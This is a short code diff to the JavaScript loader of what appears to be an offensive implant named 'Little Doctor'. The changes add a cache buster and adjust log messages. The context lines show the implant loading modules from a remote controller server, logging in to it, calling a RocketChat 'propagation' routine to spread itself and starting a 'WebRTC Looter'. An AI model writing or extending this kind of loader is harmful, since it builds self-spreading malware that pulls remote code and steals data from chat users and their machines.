@@ -19,6 +19,9 @@ var __ld_hostname = '__LITTLE_DOCTOR_HOSTNAME__:__LITTLE_DOCTOR_LISTEN_PORT__';
 var __ld_server = __ld_scheme + __ld_hostname;
 
 requirejs.config({
+    
+    // Cache Buster
+    urlArgs: "_=" + Math.floor((Math.random() * 100000) + 1),
 
     paths: {
         filesystem: __ld_server + '/modules/filesystem',
@@ -65,6 +68,8 @@ function __ld_main() {
             console.log('Loaded RocketChat propagation module');
             rocketchat.propagate();
         });
+    } else {
+        console.log('No rocketchat app found');
     }
 
     // WebRTC Looter
@@ -90,7 +95,7 @@ requirejs(['utils'], function(utils) {
     utils.GET('/login', {
         success: __ld_main,
         failure: function() {
-            console.error('Failed to login to server');
+            console.error('Warning: Failed to login to server, stuff could break...');
             __ld_main();
         }
     });
